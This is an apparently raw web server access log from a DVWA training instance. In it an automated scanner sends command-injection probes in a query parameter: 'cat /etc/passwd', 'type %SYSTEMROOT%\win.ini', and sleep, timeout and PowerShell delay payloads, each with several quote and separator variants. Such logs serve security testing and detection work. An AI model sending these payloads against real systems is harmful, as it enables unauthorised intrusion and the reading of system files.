172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%3Bget-help HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%26timeout+%2FT+15 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%3Bget-help HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%22%3Bget-help HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%27%3Bget-help HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%3Bget-help+%23 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/css/main.css?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/css/main.css?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/css/main.css?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 301 608 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 301 608 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 301 620 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 301 620 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 301 620 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 301 620 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%26sleep+15%26 HTTP/1.1" 301 586 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%3Bsleep+15%3B HTTP/1.1" 301 586 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%22%26sleep+15%26%22 HTTP/1.1" 301 598 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 301 598 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 301 596 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 301 596 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 626 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%22%3Bget-help HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 626 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 301 644 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 632 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 301 644 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 632 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%26timeout+%2FT+15 HTTP/1.1" 301 594 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 301 594 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 301 612 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 301 600 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 301 610 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 301 604 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%3Bget-help HTTP/1.1" 301 580 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%22%3Bget-help HTTP/1.1" 301 586 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%27%3Bget-help HTTP/1.1" 301 586 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%3Bget-help+%23 HTTP/1.1" 301 588 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 301 598 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 301 604 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 301 608 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 301 606 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%27%3Bget-help HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%26sleep+15%26 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%3Bsleep+15%3B HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%22%26sleep+15%26%22 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%3Bget-help+%23 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%26timeout+%2FT+15 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%3Bget-help HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%22%3Bget-help HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%27%3Bget-help HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%3Bget-help+%23 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 9338 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/login_logo.png?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
